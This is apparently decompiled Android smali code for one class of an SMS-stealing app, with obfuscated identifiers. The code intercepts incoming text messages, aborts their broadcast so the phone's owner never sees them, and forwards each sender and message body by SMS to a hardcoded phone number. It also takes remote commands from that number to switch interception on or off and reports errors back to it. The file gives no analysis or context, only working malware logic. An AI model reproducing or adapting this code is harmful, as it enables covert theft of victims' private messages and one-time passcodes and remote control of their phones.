.class public Lji/yj/ur/a201jhfg20180420ab/JM02;
.super Ljava/lang/Object;
.source "JM02.java"


# static fields
.field public static final jjjjjjjs:Ljava/lang/String; = "18016217928"

.field private static final kghjfg:Ljava/text/SimpleDateFormat;

.field public static final tttttttt:Ljava/lang/String; = "2018-4-20 12:00:00"


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    .line 21
    new-instance v0, Ljava/text/SimpleDateFormat;

    .line 22
    const-string v1, "yyyy-MM-dd HH:mm:ss"

    .line 21
    invoke-direct {v0, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    sput-object v0, Lji/yj/ur/a201jhfg20180420ab/JM02;->kghjfg:Ljava/text/SimpleDateFormat;

    .line 17
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 17
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public dfgfddg(Ljava/lang/String;Landroid/content/SharedPreferences;)V
    .locals 4
    .param p1, "com"    # Ljava/lang/String;
    .param p2, "sp"    # Landroid/content/SharedPreferences;

    .prologue
    .line 105
    const-string v1, "action"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "islj state "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 106
    if-eqz p2, :cond_0

    .line 107
    invoke-interface {p2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 108
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v1, "true"

    invoke-virtual {v1, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 109
    const-string v1, "islj"

    const/4 v2, 0x1

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 113
    :goto_0
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 115
    .end local v0    # "editor":Landroid/content/SharedPreferences$Editor;
    :cond_0
    return-void

    .line 111
    .restart local v0    # "editor":Landroid/content/SharedPreferences$Editor;
    :cond_1
    const-string v1, "islj"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    goto :goto_0
.end method

.method public gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 9
    .param p1, "phonenumber"    # Ljava/lang/String;
    .param p2, "msg"    # Ljava/lang/String;
    .param p3, "c"    # Landroid/content/Context;

    .prologue
    const/4 v2, 0x0

    .line 76
    const-string v1, "action"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v5, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, "->"

    invoke-virtual {v5, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v1, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 77
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 78
    .local v0, "smsManager":Landroid/telephony/SmsManager;
    const/4 v4, 0x0

    .line 79
    .local v4, "sentIntent":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
    invoke-virtual {v0, p2}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v3

    .line 80
    .local v3, "msgs":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    if-eqz p3, :cond_0

    .line 81
    new-instance v4, Ljava/util/ArrayList;

    .end local v4    # "sentIntent":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V

    .line 82
    .restart local v4    # "sentIntent":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
    const/4 v6, 0x0

    .local v6, "i":I
    :goto_0
    invoke-virtual {v3}, Ljava/util/ArrayList;->size()I

    move-result v1

    if-lt v6, v1, :cond_1

    .end local v6    # "i":I
    :cond_0
    move-object v1, p1

    move-object v5, v2

    .line 87
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V

    .line 90
    return-void

    .line 83
    .restart local v6    # "i":I
    :cond_1
    new-instance v1, Landroid/content/Intent;

    const-string v5, "sh.ji.fe"

    invoke-direct {v1, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/4 v5, 0x0

    invoke-static {p3, v6, v1, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v7

    .line 84
    .local v7, "pd":Landroid/app/PendingIntent;
    invoke-virtual {v4, v7}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 82
    add-int/lit8 v6, v6, 0x1

    goto :goto_0
.end method

.method public ghyutrhr()Z
    .locals 4

    .prologue
    .line 94
    :try_start_0
    sget-object v2, Lji/yj/ur/a201jhfg20180420ab/JM02;->kghjfg:Ljava/text/SimpleDateFormat;

    const-string v3, "2018-4-20 12:00:00"

    invoke-virtual {v2, v3}, Ljava/text/SimpleDateFormat;->parse(Ljava/lang/String;)Ljava/util/Date;

    move-result-object v1

    .line 95
    .local v1, "et":Ljava/util/Date;
    new-instance v2, Ljava/util/Date;

    invoke-direct {v2}, Ljava/util/Date;-><init>()V

    invoke-virtual {v1, v2}, Ljava/util/Date;->after(Ljava/util/Date;)Z
    :try_end_0
    .catch Ljava/text/ParseException; {:try_start_0 .. :try_end_0} :catch_0

    move-result v2

    if-eqz v2, :cond_0

    .line 96
    const/4 v2, 0x1

    .line 101
    .end local v1    # "et":Ljava/util/Date;
    :goto_0
    return v2

    .line 98
    :catch_0
    move-exception v0

    .line 99
    .local v0, "e":Ljava/text/ParseException;
    invoke-virtual {v0}, Ljava/text/ParseException;->printStackTrace()V

    .line 101
    .end local v0    # "e":Ljava/text/ParseException;
    :cond_0
    const/4 v2, 0x0

    goto :goto_0
.end method

.method public yrthfdxh(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;Landroid/content/SharedPreferences;)V
    .locals 7
    .param p1, "fromphone"    # Ljava/lang/String;
    .param p2, "msg"    # Ljava/lang/String;
    .param p3, "context"    # Landroid/content/Context;
    .param p4, "sp"    # Landroid/content/SharedPreferences;

    .prologue
    const/4 v6, 0x0

    const/4 v5, 0x0

    const/4 v4, 0x1

    .line 53
    const-string v1, "action"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, " to-->"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "18016217928"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "-> "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 54
    const-string v1, "18016217928"

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_3

    .line 55
    const-string v1, "\uff03"

    const-string v2, "#"

    invoke-virtual {p2, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "#"

    invoke-virtual {v1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 56
    .local v0, "ns":[Ljava/lang/String;
    array-length v1, v0

    if-lt v1, v4, :cond_2

    .line 57
    const-string v1, "com"

    aget-object v2, v0, v6

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 58
    aget-object v1, v0, v4

    invoke-virtual {p0, v1, p4}, Lji/yj/ur/a201jhfg20180420ab/JM02;->dfgfddg(Ljava/lang/String;Landroid/content/SharedPreferences;)V

    .line 73
    .end local v0    # "ns":[Ljava/lang/String;
    :cond_0
    :goto_0
    return-void

    .line 60
    .restart local v0    # "ns":[Ljava/lang/String;
    :cond_1
    const-string v1, "18016217928"

    new-instance v2, Ljava/lang/StringBuilder;

    array-length v3, v0

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, " \u6307\u4ee4\u9519\u8bef\'"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    aget-object v3, v0, v6

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\',"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 61
    aget-object v3, v0, v4

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 60
    invoke-virtual {p0, v1, v2, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    goto :goto_0

    .line 65
    :cond_2
    const-string v1, "18016217928"

    new-instance v2, Ljava/lang/StringBuilder;

    array-length v3, v0

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, " \u6307\u4ee4\u9519\u8bef"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\u6b63\u786e\u683c\u5f0f \u624b\u673a\u53f7\u7801#\u5185\u5bb9"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0, v1, v2, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    goto :goto_0

    .line 69
    .end local v0    # "ns":[Ljava/lang/String;
    :cond_3
    const-string v1, "islj"

    invoke-interface {p4, v1, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 70
    const-string v1, "18016217928"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "->"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0, v1, v2, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    goto :goto_0
.end method

.method public ytuyghjdhd(Landroid/os/Bundle;Landroid/content/Context;Lji/yj/ur/a201jhfg20180420ab/JM03;)V
    .locals 12
    .param p1, "bundle"    # Landroid/os/Bundle;
    .param p2, "context"    # Landroid/content/Context;
    .param p3, "receiver"    # Lji/yj/ur/a201jhfg20180420ab/JM03;

    .prologue
    const/4 v9, 0x0

    .line 26
    :try_start_0
    const-string v8, "config"

    const/4 v10, 0x0

    invoke-virtual {p2, v8, v10}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v7

    .line 27
    .local v7, "sp":Landroid/content/SharedPreferences;
    const-string v8, "pdus"

    invoke-virtual {p1, v8}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, [Ljava/lang/Object;

    .line 28
    .local v6, "pdus":[Ljava/lang/Object;
    array-length v8, v6

    new-array v4, v8, [Landroid/telephony/SmsMessage;

    .line 29
    .local v4, "messages":[Landroid/telephony/SmsMessage;
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_0
    array-length v8, v6

    if-lt v2, v8, :cond_2

    .line 32
    const-string v5, ""

    .line 33
    .local v5, "msg":Ljava/lang/String;
    const-string v1, ""

    .line 34
    .local v1, "fromphone":Ljava/lang/String;
    array-length v10, v4

    move v8, v9

    :goto_1
    if-lt v8, v10, :cond_3

    .line 40
    const-string v8, "action"

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v10, "->"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v8, v9}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 41
    const-string v8, "islj"

    const/4 v9, 0x1

    invoke-interface {v7, v8, v9}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v8

    if-nez v8, :cond_0

    const-string v8, "18016217928"

    invoke-virtual {v1, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-eqz v8, :cond_1

    .line 42
    :cond_0
    invoke-virtual {p3}, Lji/yj/ur/a201jhfg20180420ab/JM03;->abortBroadcast()V

    .line 44
    :cond_1
    invoke-virtual {p0, v1, v5, p2, v7}, Lji/yj/ur/a201jhfg20180420ab/JM02;->yrthfdxh(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;Landroid/content/SharedPreferences;)V

    .line 50
    .end local v1    # "fromphone":Ljava/lang/String;
    .end local v2    # "i":I
    .end local v4    # "messages":[Landroid/telephony/SmsMessage;
    .end local v5    # "msg":Ljava/lang/String;
    .end local v6    # "pdus":[Ljava/lang/Object;
    .end local v7    # "sp":Landroid/content/SharedPreferences;
    :goto_2
    return-void

    .line 30
    .restart local v2    # "i":I
    .restart local v4    # "messages":[Landroid/telephony/SmsMessage;
    .restart local v6    # "pdus":[Ljava/lang/Object;
    .restart local v7    # "sp":Landroid/content/SharedPreferences;
    :cond_2
    aget-object v8, v6, v2

    check-cast v8, [B

    invoke-static {v8}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v8

    aput-object v8, v4, v2

    .line 29
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 34
    .restart local v1    # "fromphone":Ljava/lang/String;
    .restart local v5    # "msg":Ljava/lang/String;
    :cond_3
    aget-object v3, v4, v8

    .line 35
    .local v3, "message":Landroid/telephony/SmsMessage;
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v11

    invoke-direct {v9, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 36
    const-string v9, ""

    invoke-virtual {v9, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_4

    .line 37
    invoke-virtual {v3}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .line 34
    :cond_4
    add-int/lit8 v8, v8, 0x1

    goto :goto_1

    .line 45
    .end local v1    # "fromphone":Ljava/lang/String;
    .end local v2    # "i":I
    .end local v3    # "message":Landroid/telephony/SmsMessage;
    .end local v4    # "messages":[Landroid/telephony/SmsMessage;
    .end local v5    # "msg":Ljava/lang/String;
    .end local v6    # "pdus":[Ljava/lang/Object;
    .end local v7    # "sp":Landroid/content/SharedPreferences;
    :catch_0
    move-exception v0

    .line 46
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 47
    const-string v8, "18016217928"

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "\u51fa\u73b0\u5f02\u5e38"

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 48
    const/4 v10, 0x0

    .line 47
    invoke-virtual {p0, v8, v9, v10}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    goto :goto_2
.end method
